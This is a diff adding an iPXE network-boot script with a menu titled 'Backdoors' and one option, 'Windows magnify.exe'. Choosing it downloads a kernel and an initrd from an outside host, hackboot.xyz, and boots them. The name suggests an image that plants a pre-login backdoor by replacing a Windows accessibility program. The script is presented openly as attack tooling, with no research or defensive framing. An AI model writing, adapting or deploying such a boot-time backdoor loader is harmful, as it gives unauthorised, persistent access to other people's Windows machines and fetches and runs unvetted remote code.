@@ -1,0 +1,16 @@
+#!ipxe
+
+:backdoor
+menu Backdoors
+item win Windows magnify.exe
+choose backdoor_version || goto backdoor_exit
+goto boot
+
+:boot
+imgfree  # Discard any already-downloaded images
+kernel https://hackboot.xyz/${backdoor_version}/vmlinuz
+initrd https://hackboot.xyz/${backdoor_version}/core.gz
+boot
+
+:backdoor_exit
+exit 0
